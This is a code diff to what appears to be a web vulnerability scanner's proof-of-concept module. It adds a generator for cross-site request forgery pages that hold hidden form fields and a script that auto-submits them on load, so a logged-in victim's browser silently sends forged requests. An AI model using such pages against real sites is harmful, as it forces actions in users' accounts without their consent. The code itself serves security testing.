@@ -16,18 +16,22 @@ def generate_pocs(findings: list, scan_dir: str):
     
     clickjacking_targets = set()
     mime_sniffing_targets = set()
+    csrf_targets: list[dict] = []
 
     # Identify targets that are missing specific headers
     for f in findings:
-        if f.get("type") == "Missing_Security_Header":
+        ftype = f.get("type", "")
+        if ftype == "Missing_Security_Header":
             header = f.get("param", "").lower()
             url = f.get("url", "")
             if header in ["x-frame-options", "content-security-policy"]:
                 clickjacking_targets.add(url)
             elif header == "x-content-type-options":
                 mime_sniffing_targets.add(url)
+        elif ftype == "CSRF" or ftype.startswith("CSRF"):
+            csrf_targets.append(f)
 
-    if not clickjacking_targets and not mime_sniffing_targets:
+    if not clickjacking_targets and not mime_sniffing_targets and not csrf_targets:
         return
 
     os.makedirs(poc_dir, exist_ok=True)
@@ -46,6 +50,16 @@ def generate_pocs(findings: list, scan_dir: str):
         safe_name = parsed.netloc.replace(":", "_")
         filename = os.path.join(poc_dir, f"mime_sniffing_{safe_name}.html")
         _create_mime_poc(url, filename)
+
+    # 3. CSRF PoC Generator
+    for finding in csrf_targets:
+        url = finding.get("url", "")
+        if not url:
+            continue
+        parsed = urlparse(url)
+        safe_name = (parsed.netloc + parsed.path).replace(":", "_").replace("/", "_").strip("_") or "target"
+        filename = os.path.join(poc_dir, f"csrf_{safe_name}.html")
+        _create_csrf_poc(finding, filename)
 
 
 def _create_clickjacking_poc(url: str, filepath: str):
@@ -106,3 +120,58 @@ def _create_mime_poc(url: str, filepath: str):
     with open(filepath, "w", encoding="utf-8") as f:
         f.write(poc_content)
     log_success(f"[PoC] Generated MIME Sniffing proof: {os.path.basename(filepath)}")
+
+
+def _create_csrf_poc(finding: dict, filepath: str):
+    """Generate a CSRF auto-submitting HTML form PoC.
+
+    Builds a self-submitting HTML form that posts to the vulnerable URL
+    using the original method/parameters captured during scan. The PoC is
+    static — no JavaScript execution against the live site is required.
+    """
+    url = finding.get("url", "")
+    method = (finding.get("method") or "POST").upper()
+    fields = finding.get("form_fields") or finding.get("params") or {}
+    if isinstance(fields, list):
+        fields = {item.get("name", f"field{i}"): item.get("value", "") for i, item in enumerate(fields)}
+
+    rows = "".join(
+        f'    <input type="hidden" name="{name}" value="{value}" />\n'
+        for name, value in fields.items()
+    ) or '    <!-- No captured form fields; supply manually before delivery. -->\n'
+
+    poc_content = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - {url}</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; background:#f4f4f4; padding:30px; }}
+        .header {{ background:#ff4757; color:white; padding:16px; border-radius:6px; }}
+        pre    {{ background:#222; color:#0f0; padding:14px; border-radius:6px; overflow:auto; }}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h2>CSRF Vulnerability Proof of Concept</h2>
+        <p>Target: <strong>{url}</strong></p>
+        <p>Method: <strong>{method}</strong></p>
+        <p>The target form does not enforce a CSRF token. Loading this page in
+        an authenticated victim's browser will silently submit the request below.</p>
+    </div>
+
+    <h3>Auto-submitting form:</h3>
+    <form id="csrf" action="{url}" method="{method.lower()}">
+{rows}    </form>
+
+    <h3>Captured fields:</h3>
+    <pre>{fields if fields else '(none)'}</pre>
+
+    <script>
+        // Auto-submit on load — comment out for manual review.
+        document.getElementById('csrf').submit();
+    </script>
+</body>
+</html>"""
+    with open(filepath, "w", encoding="utf-8") as f:
+        f.write(poc_content)
+    log_success(f"[PoC] Generated CSRF proof: {os.path.basename(filepath)}")
